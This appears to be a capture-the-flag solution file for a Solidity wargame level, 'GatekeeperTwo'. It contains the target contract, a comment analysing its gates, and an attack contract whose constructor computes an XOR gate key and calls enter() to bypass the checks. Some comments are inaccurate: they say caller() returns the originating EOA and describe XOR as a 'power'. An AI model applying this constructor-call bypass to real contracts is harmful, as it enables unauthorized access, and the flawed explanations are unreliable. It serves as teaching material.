// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

/*
Let's start our discussion upon gatekeeper 2 analysis here:
1. I see the 1st modifier requesting same as the Gatekeeper msg.sender != tx.origin this will be satisified by calling with attacker EOA.
2. 2nd modifier : which is with assembly where we have two op codes caller() which will retrieve the address of EOA which is initiated and extcodesize() which will retrieve the size of address provided and where the memory is allocated. this modifier checks require(extcodesize(caller()) == 0) which means that the address addr has no code associated with it.
3. here they are encoding the msg.sender to bytes8 and its power of uint64(gatekey) is checking with type(uint64).max equal or not . which is the encoded(msg.sende)r^key = max value of uint64.
*/

contract GatekeeperTwoAttack {
    constructor(address gatekeeperAddr) {
        bytes8 gateKey = bytes8(
            uint64(
                bytes8(keccak256(abi.encodePacked(address(this))))
            ) ^ type(uint64).max
        );

        GatekeeperTwo(gatekeeperAddr).enter(gateKey);
    }
}

